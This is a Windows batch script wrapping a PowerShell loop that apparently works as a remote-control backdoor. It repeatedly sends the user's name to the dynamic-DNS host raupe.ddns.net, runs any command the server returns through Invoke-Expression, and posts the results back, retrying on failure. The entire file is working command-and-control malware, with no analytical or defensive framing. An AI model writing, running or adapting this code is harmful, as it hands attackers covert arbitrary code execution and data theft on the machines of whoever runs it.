@echo off
set url=raupe.ddns.net/cdr

:loop
powershell -NoProfile -Command ^
    "$url = 'raupe.ddns.net/cdr';" ^
    "$separator = ' ||| ';" ^
    "$username = $env:USERNAME;" ^
    "$lastCommand = '';" ^
    "$ErrorActionPreference = 'Stop';" ^
    "while ($true) {" ^
    "    Write-Host \"Sending POST request to $url\";" ^
    "    $body = \"$username$separator\" + 'GET';" ^
    "    $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'};" ^
    "    $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -Headers $headers -TimeoutSec 20;" ^
    "    $receivedCommand = $response.Content.Trim();" ^
    "    if ([string]::IsNullOrWhiteSpace($receivedCommand)) {" ^
    "        Write-Host 'No command received. Waiting...';" ^
    "        Start-Sleep -Seconds 10;" ^
    "    } elseif ($receivedCommand -eq $lastCommand) {" ^
    "        Write-Host 'Same command as last one. Waiting...';" ^
    "        Start-Sleep -Seconds 10;" ^
    "    } else {" ^
    "        try {" ^
    "            Write-Host \"Executing: $receivedCommand\";" ^
    "            try {" ^
    "                $output = Invoke-Expression $receivedCommand 2>&1 | Out-String;" ^
    "                $output = $output.Trim();" ^
    "                if ([string]::IsNullOrWhiteSpace($output)) {" ^
    "                    $output = \"'$receivedCommand' executed\";" ^
    "                }" ^
    "            } catch {" ^
    "                $output = \"Error executing command: $($_.Exception.Message)\";" ^
    "                Write-Host $output;" ^
    "            }" ^
    "        } catch {" ^
    "            $output = \"Unexpected error: $($_.Exception.Message)\";" ^
    "            Write-Host $output;" ^
    "        }" ^
    "        $finalOutput = \"$username$separator$output\";" ^
    "        Write-Host \"Sending response: $finalOutput\";" ^
    "        $headers = @{'Content-Type' = 'text/plain'};" ^
    "        $postSuccess = $false;" ^
    "        $postAttempts = 0;" ^
    "        while (-not $postSuccess -and $postAttempts -lt 3) {" ^
    "            try {" ^
    "                Invoke-WebRequest -Uri $url -Method Post -Body $finalOutput -Headers $headers -TimeoutSec 20;" ^
    "                $postSuccess = $true;" ^
    "            } catch {" ^
    "                Write-Host \"Error sending POST request: $($_.Exception.Message)\";" ^
    "                Start-Sleep -Seconds 5;" ^
    "                $postAttempts++;" ^
    "            }" ^
    "        }" ^
    "        if (-not $postSuccess) { Write-Host 'Failed to send output after 3 attempts. Continuing...'; }" ^
    "        if ($output -like 'Error*') {" ^
    "            Start-Sleep -Seconds 10;" ^
    "        }" ^
    "        $lastCommand = $receivedCommand;" ^
    "    }" ^
    "}" ^
echo Looping again...
goto loop
